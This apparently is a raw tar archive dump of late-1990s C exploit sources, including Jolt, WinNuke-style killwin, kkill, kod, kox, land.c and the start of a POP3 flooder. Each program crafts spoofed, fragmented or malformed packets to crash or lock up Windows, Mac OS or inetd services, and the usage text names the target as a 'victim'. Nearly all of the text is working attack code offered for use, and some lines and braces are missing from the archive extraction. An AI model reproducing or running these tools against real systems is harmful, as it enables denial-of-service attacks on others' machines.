            " * Ok so all this does is build a really fraggmented over sized packet",
            " * and once win95 gets it, and puts it back together it locks.  I send",
            " * multiple packets by default cause some times it takes a few packets to",
            " * totally freeze the host.  Maybe its spending processor time to figure",
            " * out how to put them back together?  I've had reports of people blue",
            " * screening from it tho so we'll let Microsoft's boys figure out exactly",
            " * what this does to 95.  As of now i haven't tested it on NT, but maybe",
            " * i will later ;).  All of this source wasn't origonally written by me",
            " * I just took one of the old programs to kill POSIX and SYSV based",
            " * systems and worked on it abit, then made it spoof =). ",
            " * VallaH  (yaway@hotmail.com)",
            " *  Update: It apears to work on some older versions of mac os",
            "/* Yah this is for linux, but i like the BSD ip header better then linux's */",
            "#define __BSD_SOURCE",
            "#include <stdio.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <string.h>",
            "#include <arpa/inet.h>",
            "int main(int argc, char **argv)",
            "\tint s,i;",
            "\tchar buf[400];",
            "\tstruct ip *ip = (struct ip *)buf;",
            "\tstruct icmphdr *icmp = (struct icmphdr *)(ip + 1);",
            "\tstruct hostent *hp, *hp2;",
            "\tstruct sockaddr_in dst;",
            "\tint offset;",
            "\tint on;",
            "\tint num = 5;",
            "\tif (argc < 3) {",
            "\t\tprintf(\"Jolt v1.0 Yet ANOTHER windows95(And macOS!) glitch by VallaH (yaway@hotmail.com)\\n\");",
            "\t\tprintf(\"\\nusage: %s <dstaddr> <saddr> [number]\\n\",argv[0]);",
            "\t\tprintf(\"\\tdstaddr is the host your attacking\\n\");",
            "\t\tprintf(\"\\tsaddr is the host your spoofing from\\n\");",
            "\t\tprintf(\"\\tNumber is the number of packets to send, 5 is the default\\n\");",
            "\t\tprintf(\"\\nNOTE:  This is based on a bug that used to affect POSIX complient, and SYSV \\n\\t systems so its nothing new..\\n\");",
            "\t\tprintf(\"\\nGreets to Bill Gates! How do ya like this one? :-)\\n\");",
            "\t\texit(1);",
            "\tif (argc == 4) num = atoi(argv[3]);",
            "    for (i=1;i<=num;i++) {",
            "\ton=1;",
            "\tbzero(buf, sizeof buf);",
            "\tif ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {",
            "\t\tperror(\"socket\");",
            "\t\texit(1);",
            "\tif (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {",
            "\t\tperror(\"IP_HDRINCL\");",
            "\t\texit(1);",
            "\tif ((hp = gethostbyname(argv[1])) == NULL) {",
            "\t\tif ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {",
            "\t\t\tfprintf(stderr, \"%s: unknown host\\n\", argv[1]);",
            "\t\t\texit(1);",
            "\t} else {",
            "\t\tbcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);",
            "\tif ((hp2 = gethostbyname(argv[2])) == NULL) {",
            "\t\tif ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {",
            "\t\t\tfprintf(stderr, \"%s: unknown host\\n\", argv[2]);",
            "\t\t\texit(1);",
            "\t} else {",
            "\t\tbcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);",
            "\tprintf(\"Sending to %s\\n\", inet_ntoa(ip->ip_dst));",
            "\tip->ip_v = 4;",
            "\tip->ip_hl = sizeof *ip >> 2;",
            "\tip->ip_tos = 0;",
            "\tip->ip_len = htons(sizeof buf);",
            "\tip->ip_id = htons(4321);",
            "\tip->ip_off = htons(0);",
            "\tip->ip_ttl = 255;",
            "\tip->ip_p = 1;",
            "\tip->ip_sum = 0;                 /* kernel fills in */",
            "\tdst.sin_addr = ip->ip_dst;",
            "\tdst.sin_family = AF_INET;",
            "\ticmp->type = ICMP_ECHO;",
            "\ticmp->code = 0;",
            "\ticmp->checksum = htons(~(ICMP_ECHO << 8));",
            "\tfor (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {",
            "\t\tip->ip_off = htons(offset >> 3);",
            "\t\tif (offset < 65120)",
            "\t\t\tip->ip_off |= htons(0x2000);",
            "\t\telse",
            "\t\t\tip->ip_len = htons(418);  /* make total 65538 */",
            "\t\tif (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,",
            "\t\t\t\t\tsizeof dst) < 0) {",
            "\t\t\tfprintf(stderr, \"offset %d: \", offset);",
            "\t\t\tperror(\"sendto\");",
            "\t\tif (offset == 0) {",
            "\t\t\ticmp->type = 0;",
            "\t\t\ticmp->code = 0;",
            "\t\t\ticmp->checksum = 0;",
            "\tclose(s);",
            "    }",
            "\treturn 0;",
            "datapool/src/kill_inetd.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007013",
            "07100064752",
            "014433",
            "ustar  ",
            "root",
            "root",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#include <linux/ip.h>",
            "#include <linux/tcp.h>",
            "#include <stdio.h>",
            "#define NPROBES 1",
            "#define SEQ 0x28374839",
            "unsigned short",
            "ip_sum (addr, len)",
            "     u_short *addr;",
            "     int len;",
            "  register int nleft = len;",
            "  register u_short *w = addr;",
            "  register int sum = 0;",
            "  u_short answer = 0;",
            "  /*",
            "   * Our algorithm is simple, using a 32 bit accumulator (sum), we add",
            "   * sequential 16 bit words to it, and at the end, fold back all the",
            "   * carry bits from the top 16 bits into the lower 16 bits.",
            "   */",
            "  while (nleft > 1)",
            "    {",
            "      sum += *w++;",
            "      nleft -= 2;",
            "    }",
            "  /* mop up an odd byte, if necessary */",
            "  if (nleft == 1)",
            "    {",
            "      *(u_char *) (&answer) = *(u_char *) w;",
            "      sum += answer;",
            "    }",
            "  /* add back carry outs from top 16 bits to low 16 bits */",
            "  sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */",
            "  sum += (sum >> 16);           /* add carry */",
            "  answer = ~sum;                /* truncate to 16 bits */",
            "  return (answer);",
            "int sock, ssock;",
            "void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen) {",
            "  char buf[65536];",
            "  struct {  /* rfc 793 tcp pseudo-header */",
            "    unsigned long saddr, daddr;",
            "    char mbz;",
            "    char ptcl;",
            "    unsigned short tcpl;",
            "  } ph;",
            "  struct sockaddr_in sin;\t/* how necessary is this? */",
            "  ph.saddr=ih->saddr;",
            "  ph.daddr=ih->daddr;",
            "  ph.mbz=0;",
            "  ph.ptcl=IPPROTO_TCP;",
            "  ph.tcpl=htons(sizeof(*th)+dlen);",
            "  memcpy(buf, &ph, sizeof(ph));",
            "  memcpy(buf+sizeof(ph), th, sizeof(*th));",
            "  memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);",
            "  memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);",
            "  th->check=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);",
            "  memcpy(buf, ih, 4*ih->ihl);",
            "  memcpy(buf+4*ih->ihl, th, sizeof(*th));",
            "  memcpy(buf+4*ih->ihl+sizeof(*th), data, dlen);",
            "  memset(buf+4*ih->ihl+sizeof(*th)+dlen, 0, 4);",
            "  ih->check=ip_sum(buf, (4*ih->ihl + sizeof(*th)+ dlen + 1) & ~1);",
            "  memcpy(buf, ih, 4*ih->ihl);",
            "  sin.sin_family=AF_INET;",
            "  sin.sin_port=th->dest;",
            "  sin.sin_addr.s_addr=ih->daddr;",
            "  if(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0,",
            "\t &sin, sizeof(sin))<0) {",
            "    perror(\"sendto\");",
            "    exit(1);",
            "probe_seq(unsigned long my_ip, unsigned long their_ip, unsigned short port) {",
            "  int i;",
            "  struct iphdr ih;",
            "  struct tcphdr th;",
            "  char buf[1024];",
            "  ih.version=4;",
            "  ih.ihl=5;",
            "  ih.tos=0;\t\t\t/* XXX is this normal? */",
            "  ih.tot_len=sizeof(ih)+sizeof(th);",
            "  ih.id=htons(6969);",
            "  ih.frag_off=0;",
            "  ih.ttl=30;",
            "  ih.protocol=IPPROTO_TCP;",
            "  ih.check=0;",
            "  ih.saddr=my_ip;",
            "  ih.daddr=their_ip;",
            "  th.source=htons(9999);",
            "  th.dest=htons(port);",
            "  th.seq=htonl(SEQ+i);",
            "  th.ack_seq=0;",
            "  th.res1=0;",
            "  th.doff=sizeof(th)/4;",
            "  th.fin=0;",
            "  th.syn=1;",
            "  th.rst=0;",
            "  th.psh=0;",
            "  th.ack=0;",
            "  th.urg=0;",
            "  th.res2=0;",
            "  th.window=htons(512);",
            "  th.check=0;",
            "  th.urg_ptr=0;",
            "  send_tcp_segment(&ih, &th, &ih, 0);",
            "unsigned long getaddr(char *name) {",
            "  struct hostent *hep;",
            "  hep=gethostbyname(name);",
            "    if(!hep) {",
            "      fprintf(stderr, \"Unknown host %s\\n\", name);",
            "      exit(1);",
            "    }",
            "  return *(unsigned long *)hep->h_addr;",
            "main(int argc, char **argv) {",
            "  unsigned long me=htonl(0x980101ae), victim;",
            "  int port=13;",
            "  struct hostent *hep;",
            "  if(argc<2) {",
            "    printf(\"Usage: %s target [port [source]]\\n\", argv[0]);",
            "    exit(1);",
            "  if(argc>=2)",
            "    victim=getaddr(argv[1]);",
            "  if(argc>=3)",
            "    port=atoi(argv[2]);",
            "  if(argc>=4)",
            "    me=getaddr(argv[3]);",
            "    ",
            "  ssock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  if(sock<0) {",
            "    perror(\"socket (raw)\");",
            "    exit(1);",
            "  probe_seq(me, victim, port);",
            "datapool/src/killwin.c",
            "0100644",
            "0000000",
            "0000000",
            "00000003127",
            "07100655426",
            "013774",
            "ustar  ",
            "root",
            "root",
            "/* killwin.c - winnuke idea, modifcation for me ONLY - napster */",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "int x, y, sockdesc, port = 139, hits = 1;",
            "char *target, *str = \"Later.\";",
            "void parse_args(int argc, char *argv[]);",
            "void usage(char *progname) {",
            "  printf(\"Usage: %s <target> [-p port (Default 139)] [-t hits (Default 1)]\\n\", progname);",
            "  exit(-1);",
            "void parse_args(int argc, char *argv[]) {",
            "  target = argv[1];",
            "  if (argv[1][0] == '-') { ",
            "    printf(\"Must specify a target.\\n\"); ",
            "    exit(-1); ",
            "  for(y=2;y<argc;y++) {",
            "    if (!strcmp(argv[y], \"-p\")) { y++; port = atoi(argv[y]); }",
            "    if (!strcmp(argv[y], \"-t\")) { y++; hits = atoi(argv[y]); }",
            "void main(int argc, char *argv[]) {",
            "  struct sockaddr_in sin;",
            "  struct hostent *he;",
            "  if (argc < 2) usage(argv[0]);",
            "  parse_args(argc, argv);",
            "  sin.sin_family  = AF_INET;",
            "  sin.sin_port    = htons(port);",
            "  he = gethostbyname(argv[1]);",
            "  if (he) {",
            "    memcpy((caddr_t)&sin.sin_addr.s_addr, he->h_addr, he->h_length);",
            "  } else {",
            "    perror(\"Resolving\");",
            "  sockdesc = socket(AF_INET, SOCK_STREAM, 0);",
            "  if (sockdesc < 0) {",
            "    perror(\"socket\");",
            "    exit(-1);",
            "  if (connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) < 0) {",
            "    perror(\"connect\");",
            "    close(sockdesc);",
            "    exit(-1);",
            "  printf(\"Connected to [%s:%d].\\n\", target, port);",
            "  printf(\"Sending crash %d times...\\n\", hits);",
            "  for (x=0;x<hits;x++) send(sockdesc, str, strlen(str), MSG_OOB);",
            "  printf(\"Done....\\n\");",
            "  close(sockdesc);",
            "  exit(0);",
            "datapool/src/kkill.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007724",
            "07070231230",
            "013425",
            "ustar  ",
            "root",
            "root",
            "/* By kbyte@rwx.ml.org / kbyte@biogate.com  */",
            "/* Made in about 15 minutes . It will close almost any door of inetd */",
            "/* Compile : cc -o kkill kkill.c and run kkill IP PORT */",
            "/* Based on high level tcp functions for linux by jjohnson@eagle.ptialaska.net",
            " and presonic@undernet.irc */",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <errno.h>",
            "#include <fcntl.h>",
            "#define SOCKET_ERR      -1",
            "#define CONNECT_ERR     -2",
            "#define NONBLOCK_ERR    -3",
            "#define LOOKUP_ERR      \"ERROR\"",
            "#define TIMEOUT 20",
            "#define BLOCKING        0",
            "#define NONBLOCKING     1",
            "int count = 0;",
            "int Connect(char *input,int port,int is_nonblock) {",
            "        int sockfd, n;",
            "        int sock_flags;",
            "        struct sockaddr_in addr;",
            "        addr.sin_port = htons(port);",
            "        addr.sin_family = AF_INET;",
            "        inet_aton(input,&addr.sin_addr);",
            "        if((sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0)",
            "        return SOCKET_ERR;",
            "        if(is_nonblock == NONBLOCKING) {",
            "                if(fcntl(sockfd,F_GETFL,sock_flags) < 0)",
            "                        return NONBLOCK_ERR;",
            "                if(fcntl(sockfd,F_SETFL,sock_flags | O_NONBLOCK) < 0)",
            "                        return NONBLOCK_ERR;",
            "        }",
            "        if(connect(sockfd,(struct sockaddr *) &addr, sizeof(addr)) < 0)",
            "        {",
            "        if(errno == EINPROGRESS) {",
            "        return sockfd;  /* its non blocking socket */",
            "        } else {",
            "        return CONNECT_ERR;",
            "        }}",
            "        return sockfd;",
            "main(int argc, char *argv[])",
            "        int i, sockfd[256], maxsockfd=0, sockopt, n;",
            "        int first = 0;",
            "        char ip[30];",
            "        fd_set wset;",
            "        socklen_t socklen;",
            "        struct timeval time;",
            "        system(\"clear\");",
            "        printf(\"\\n KKill by kbyte@rwx.ml.org \\n\");",
            "        if(argc != 3)",
            "        {",
            "                printf(\"usage: %s ip port \\n\",argv[0]);",
            "                exit(-1);",
            "        }",
            "        printf(\"\\n Killing %s on port %s \\n\\n\", argv[1], argv[2]);",
            "        close(STDIN_FILENO);",
            "        close(STDERR_FILENO);",
            "        FD_ZERO(&wset);",
            "        for(i=1 ; i != 256 ; ++i)",
            "        {",
            "                if((sockfd[i] = Connect(argv[1],atoi(argv[2]),1)) < 0)",
            "                {",
            "                printf(\"Failed calling connect() for sockfd[%d]!\\n\",i);",
            "                continue;",
            "        }",
            "        while(1)",
            "        {",
            "                for(i = 1 ; i != 256 ; ++i)",
            "                {",
            "if(getsockopt(sockfd[i],SOL_SOCKET,SO_ERROR,&sockopt,&socklen) == 0) {",
            "                              FD_SET(sockfd[i], &wset);",
            "                              if(sockfd[i] > maxsockfd) maxsockfd = sockfd[i];                }",
            "                }",
            "                time.tv_sec = TIMEOUT;",
            "                if(sockopt==111) {",
            "                if(first==0) printf(\"Port Closed. Try another one\\n\");",
            "                if(first==1) printf(\"Bum! Port closed!!!\\n\");",
            "                exit(0);",
            "                }",
            "                first = 1;",
            "                if(select(maxsockfd + 1,NULL,&wset,NULL,&time) == 0)",
            "                {",
            "                        printf(\"Completed.\\n\");",
            "                        exit(-1);",
            "                }",
            "                {",
            "                        if(FD_ISSET(sockfd[i],&wset))",
            "                        {",
            "                        /* remove the sockfd from wset */",
            "                        FD_CLR(sockfd[i],&wset);",
            "                        socklen = 4;    /* sizeof(int) */",
            "                        sockopt = -1;",
            "               getsockopt(sockfd[i],SOL_SOCKET,SO_ERROR,&sockopt,&socklen);",
            "        ",
            "                  close(sockfd[i]);",
            "\t\t  if(sockopt == ECONNREFUSED) \t{\t",
            "                  printf(\"Port Closed. Try another port\\n\");",
            "                  exit(-1);",
            "                  \t\t\t\t}",
            "                  if(sockopt == ENETUNREACH) {",
            "                  printf(\"Host unreachable. Try later\\n\");",
            "                  exit(-1);\t \t\t}",
            "                  if(sockopt == EHOSTUNREACH) {",
            "                  printf(\"Host unreachable. Try later\\n\");",
            "                  exit(-1);                     }",
            "datapool/src/koc.c",
            "0100644",
            "0000000",
            "0000000",
            "00000005365",
            "07100655444",
            "013105",
            "ustar  ",
            "root",
            "root",
            "::: [author] kod.c by klepto/defile  klepto@antisocial.com or klepto@EFnet /",
            "defile@EFnet",
            "::: [stuph ] bug found by klepto / total rewrite on *nix platform by defile",
            "::: [notes ] bluescreens windows users(98/98se) and kills tcp stack",
            "::: [m$ bug] windows handles igmp badly and this is the result",
            "::: [greets]",
            "amputee/nizda/nyt/ignitor/skyline/codelogic/ill`/conio/egotrip/TFreak/napste",
            "::: [greets] dist(test monkey)/naz(you rule",
            "period.)/#havok/#irc_addict/#kgb/#eof/everyone",
            "::: [action] ./kod <host> and BEWM!",
            "::: [rant  ] there will be lots of rewrites to this.. just get our name",
            "right!",
            "de omnibus dubitandum",
            "windows core dump output (*whee*)",
            "An exception 0E has occurred at 0028:C14C9212 in VxD VIP(01) +",
            "00006C72.  This was called from 0028:C183FF54 in VcD PPPMAC(04) +",
            "000079BR.  It may be possible to continue normally(*not*).",
            "there will be more bugs like this until bill \"big moneybags\" gates",
            "puts more effort into making windows more stable instead of patching holes.",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <errno.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "size_t hits = 5;",
            "unsigned short port = 100;",
            "void usage (char *progname)",
            "  printf(\"Usage: %s <host> -p port -t hits\\n\", progname);",
            "  exit(1);",
            "void parse_args (int argc, char *argv[], char **target)",
            " int y;",
            " *target = argv[1];",
            " if (argv[1][0] == '-') {",
            "  printf (\"Must specify a target.\\n\");",
            "  exit (1);",
            " for (y=2; y < argc; y++) {",
            "  if (!strcmp(argv[y], \"-p\")) {",
            "   y++;",
            "   port = atoi (argv[y]);",
            "  } else if (!strcmp(argv[y], \"-t\")) {",
            "   y++;",
            "   hits = atoi (argv[y]);",
            "int main (int argc, char *argv[])",
            " struct sockaddr_in sin;",
            " struct hostent *he;",
            " size_t maxpkt = 15000;",
            " char *target;",
            " char buf[15000];",
            " int sd;",
            " if (argc < 2)",
            "  usage (argv[0]);",
            " parse_args (argc, argv, &target);",
            " if ((he = gethostbyname (target)) == NULL) {",
            "  herror (target);",
            "  exit (1);",
            " memcpy (&sin.sin_addr.s_addr, he->h_addr, he->h_length);",
            " sin.sin_family = AF_INET;",
            " sin.sin_port = htons (port);",
            " if ((sd = socket (AF_INET, SOCK_RAW, 2)) == -1) {",
            "  perror (\"error: socket()\");",
            "  exit (1);",
            " if (-1 == connect (sd, (struct sockaddr *)&sin, sizeof (sin))) {",
            "  perror (\"error: connect()\");",
            "  close (sd);",
            "  exit (1);",
            " puts (\"Determining max MSGSIZE\");",
            " while (send (sd, buf, maxpkt, 0) == -1) {",
            "  if (EMSGSIZE != errno) {",
            "   perror (\"error: send()\");",
            "   close (sd);",
            "   exit (1);",
            "  maxpkt -= 1;",
            " hits--;",
            " printf (\"Max MSGSIZE is %d\\n..%d bytes [%s:%d]..\\n\", maxpkt,",
            "   maxpkt, target, port);",
            " while (hits--) {",
            "  if (send (sd, buf, maxpkt, 0) == -1) {",
            "   perror (\"error: send()\");",
            "   close (sd);",
            "   exit (1);",
            "  printf (\"..%d bytes [%s:%d]..\\n\", maxpkt, target, port);",
            " close (sd);",
            " puts (\"complete.\");",
            " exit (0);",
            "datapool/src/kox.c",
            "0100644",
            "0000000",
            "0000000",
            "00000012170",
            "07100655456",
            "013125",
            "ustar  ",
            "root",
            "root",
            "/***",
            "        Kox by Coolio (coolio@k-r4d.com)",
            "        this was a successful attempt to duplicate klepto/defile's kod win98",
            "        exploit and add spoofing support to it. me and defile made this a",
            "        race to see who could do spoofing kod first. he won. (mine's better!)",
            "        my kox and defile's skod output about the same packets",
            "        but he had skod working a few hours before i had kox working.",
            "        affected systems: windows 98, windows 98 SE, windows 2000 build 2000",
            "        results: bluescreen, tcp/ip stack failure, lockup, or instant reboot",
            "        thanks to klepto and defile for making kod, psilord for wanting",
            "        to understand what we were doing, greg for telling me about iphdr.ihl,",
            "        mancide for letting me use his win98 boxen to test on, and the",
            "        few other people i crashed trying to get this working right.",
            "        also thanks to the authors of elvis for making such a badass editor.",
            "\tedited by spender after finding out how gay slow it was=P",
            "\tadded number option",
            "***/",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <netdb.h>",
            "#include <string.h>",
            "#include <errno.h>",
            "#include <pwd.h>",
            "#include <time.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <sys/utsname.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <netinet/igmp.h>",
            "void usage(char *arg)",
            "        printf(\"Kox by Coolio (coolio@k-r4d.com)\\n\");",
            "        printf(\"Usage: %s <victim> <number>\\n\", arg);",
            "        exit(1);",
            "unsigned int randip()",
            "        struct hostent *he;",
            "        struct sockaddr_in sin;",
            "        char *buf = (char *)calloc(1, sizeof(char) * 16);",
            "        sprintf(buf, \"%d.%d.%d.%d\",",
            "                (random()%191)+23,",
            "                (random()%253)+1,",
            "                (random()%253)+1,",
            "                (random()%253)+1); ",
            "        inet_aton(buf, (struct in_addr *)&sin);",
            "        return sin.sin_addr.s_addr;",
            "unsigned short in_cksum(unsigned short *buh, int len)",
            "        register long sum = 0;",
            "        unsigned short oddbyte;",
            "        register unsigned short answer;",
            "        while(len > 1) {",
            "                sum += *buh++;",
            "                len -= 2;",
            "        }",
            "        if(len == 1) {",
            "                oddbyte = 0;",
            "                *((unsigned char *)&oddbyte) = *(unsigned char *)buh;",
            "                sum += oddbyte;",
            "        }",
            "        sum = (sum >> 16) + (sum & 0xFFFF);",
            "        sum += (sum >> 16);",
            "        answer = ~sum;",
            "        return answer;",
            "int nuke_igmp(struct sockaddr_in *victim, unsigned long spoof)",
            "        int BIGIGMP = 1500;",
            "        unsigned char *pkt;",
            "        struct iphdr *ip;",
            "        struct igmphdr *igmp;",
            "        struct utsname *un;",
            "        struct passwd *p;",
            "        int i, s;",
            "        int id = (random() % 40000) + 500;",
            "        pkt = (unsigned char *)calloc(1, BIGIGMP);",
            "        ip = (struct iphdr *)pkt;",
            "        igmp = (struct igmphdr *)(pkt + sizeof(struct iphdr));",
            "        ip->version = 4;",
            "        ip->ihl = (sizeof *ip) / 4;",
            "        ip->ttl = 255;",
            "        ip->tot_len = htons(BIGIGMP);",
            "        ip->protocol = IPPROTO_IGMP;",
            "        ip->id = htons(id);",
            "        ip->frag_off = htons(IP_MF);",
            "        ip->saddr = spoof;",
            "        ip->daddr = victim->sin_addr.s_addr;",
            "        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));",
            "        igmp->type = 0;",
            "        igmp->group = 0;",
            "        igmp->csum = in_cksum((unsigned short *)igmp, sizeof(struct igmphdr));",
            "        for(i = sizeof(struct iphdr) + sizeof(struct igmphdr) + 1;",
            "            i < BIGIGMP; i++)",
            "                pkt[i] = random() % 255;",
            "#ifndef I_GROK",
            "        un = (struct utsname *)(pkt + sizeof(struct iphdr) +",
            "              sizeof(struct igmphdr) + 40);",
            "        uname(un);",
            "        p = (struct passwd *)((void *)un + sizeof(struct utsname) + 10);",
            "        memcpy(p, getpwuid(getuid()), sizeof(struct passwd));",
            "#endif",
            "        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "                perror(\"error: socket()\");",
            "                return 1;",
            "        }",
            "        if(sendto(s, pkt, BIGIGMP, 0, victim,",
            "           sizeof(struct sockaddr_in)) == -1) { ",
            "                perror(\"error: sendto()\");",
            "                return 1;",
            "        }",
            "        for(i = 1; i < 5; i++) {",
            "                if(i > 3)",
            "                        ip->frag_off = htons(((BIGIGMP-20) * i) >> 3);",
            "                else",
            "                        ip->frag_off = htons(((BIGIGMP-20) * i) >> 3 | IP_MF);",
            "                sendto(s, pkt, BIGIGMP, 0, victim, sizeof(struct sockaddr_in));",
            "        }",
            "        free(pkt);",
            "        close(s);",
            "        return 0;",
            "int main(int argc, char *argv[])",
            "        struct sockaddr_in victim;",
            "        struct hostent *he;",
            "        int i;",
            "        srandom(time(NULL));",
            "        if(argc < 3)",
            "                usage(argv[0]);",
            "        if((he = gethostbyname(argv[1])) == NULL) {",
            "                herror(argv[1]);",
            "                exit(1);",
            "        }",
            "        memcpy(&victim.sin_addr.s_addr, he->h_addr, he->h_length);",
            "        victim.sin_port = htons(0);",
            "        victim.sin_family = PF_INET;",
            "        printf(\"IGMP> \");",
            "        fflush(stdout);",
            "        for(i = 0; i < atoi(argv[2]); i++)",
            "        {",
            "                nuke_igmp(&victim, randip());",
            "                printf(\".\");",
            "                fflush(stdout);",
            "        }",
            "        printf(\"\\n\");",
            "        fflush(stdout);",
            "datapool/src/land.c",
            "0100644",
            "0000000",
            "0000000",
            "00000006464",
            "07100660243",
            "013241",
            "ustar  ",
            "root",
            "root",
            "/* land.c by m3lt, FLC",
            "   crashes a win95 box */",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <arpa/inet.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "#include <netinet/protocols.h>",
            "struct pseudohdr",
            "        struct in_addr saddr;",
            "        struct in_addr daddr;",
            "        u_char zero;",
            "        u_char protocol;",
            "        u_short length;",
            "        struct tcphdr tcpheader;",
            "u_short checksum(u_short * data,u_short length)",
            "        register long value;",
            "        u_short i;",
            "        for(i=0;i<(length>>1);i++)",
            "                value+=data[i];",
            "        if((length&1)==1)",
            "                value+=(data[i]<<8);",
            "        value=(value&65535)+(value>>16);",
            "        return(~value);",
            "int main(int argc,char * * argv)",
            "        struct sockaddr_in sin;",
            "        struct hostent * hoste;",
            "        int sock;",
            "        char buffer[40];",
            "        struct iphdr * ipheader=(struct iphdr *) buffer;",
            "        struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct",
            "iphdr));",
            "        struct pseudohdr pseudoheader;",
            "        fprintf(stderr,\"land.c by m3lt, FLC\\n\");",
            "        if(argc<3)",
            "        {",
            "                fprintf(stderr,\"usage: %s IP port\\n\",argv[0]);",
            "                return(-1);",
            "        }",
            "        bzero(&sin,sizeof(struct sockaddr_in));",
            "        sin.sin_family=AF_INET;",
            "        if((hoste=gethostbyname(argv[1]))!=NULL)",
            "                bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);",
            "        else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)",
            "        {",
            "                fprintf(stderr,\"unknown host %s\\n\",argv[1]);",
            "                return(-1);",
            "        }",
            "        if((sin.sin_port=htons(atoi(argv[2])))==0)",
            "        {",
            "                fprintf(stderr,\"unknown port %s\\n\",argv[2]);",
            "                return(-1);",
            "        }",
            "        if((sock=socket(AF_INET,SOCK_RAW,255))==-1)",
            "        {",
            "                fprintf(stderr,\"couldn't allocate raw socket\\n\");",
            "                return(-1);",
            "        }",
            "        bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));",
            "        ipheader->version=4;",
            "        ipheader->ihl=sizeof(struct iphdr)/4;",
            "        ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));",
            "        ipheader->id=htons(0xF1C);",
            "        ipheader->ttl=255;",
            "        ipheader->protocol=IP_TCP;",
            "        ipheader->saddr=sin.sin_addr.s_addr;",
            "        ipheader->daddr=sin.sin_addr.s_addr;",
            "        tcpheader->th_sport=sin.sin_port;",
            "        tcpheader->th_dport=sin.sin_port;",
            "        tcpheader->th_seq=htonl(0xF1C);",
            "        tcpheader->th_flags=TH_SYN;",
            "        tcpheader->th_off=sizeof(struct tcphdr)/4;",
            "        tcpheader->th_win=htons(2048);",
            "        bzero(&pseudoheader,12+sizeof(struct tcphdr));",
            "        pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;",
            "        pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;",
            "        pseudoheader.protocol=6;",
            "        pseudoheader.length=htons(sizeof(struct tcphdr));",
            "        bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct",
            "tcphdr));",
            "        tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct",
            "tcphdr));",
            "        if(sendto(sock,buffer,sizeof(struct iphdr)+sizeof(struct",
            "tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)",
            "        {",
            "                fprintf(stderr,\"couldn't send packet\\n\");",
            "                return(-1);",
            "        }",
            "        fprintf(stderr,\"%s:%s landed\\n\",argv[1],argv[2]);",
            "        close(sock);",
            "        return(0);",
            "datapool/src/laser.c",
            "0100644",
            "0000000",
            "0000000",
            "00000020476",
            "07071420511",
            "013427",
            "ustar  ",
            "root",
            "root",
            " * THIS IS PRIVATE ONLY , PLEASE DON'T DISTRIBUITE -->DrDiablo | g3n1uz | BlueEyeZ",
            " * I AM NOT RESPONSABLE FOR ANY DAMAGES ... THIS IS JUST FOR EDUCATIVE PURPOSE",
            " * ONLY AND IF YOU CRASH POP3 SERVER ANYWHERE IN THE WORLS YOU ARE RESPONSABLE",
            " * FOR ALL YOU DONE ... -->dIABLO",
            " * Code ripped from hugweb.c  by ET LoWNOISE",
            " * Thankz goes to him !!!",
            " *  A new flooder  written  by Lord of DarkNess , Evil Genius Michelangelo",
            " *  DrDiablo",
            " *  EfNet , DalNet",
            ",IrcNet ,UnderNet",
            ",BrasNet",
            " * Fill all conections to a pop3 server !!!",
            " * Ultima by DrDiablo ---> Kill you all suckers !!!",
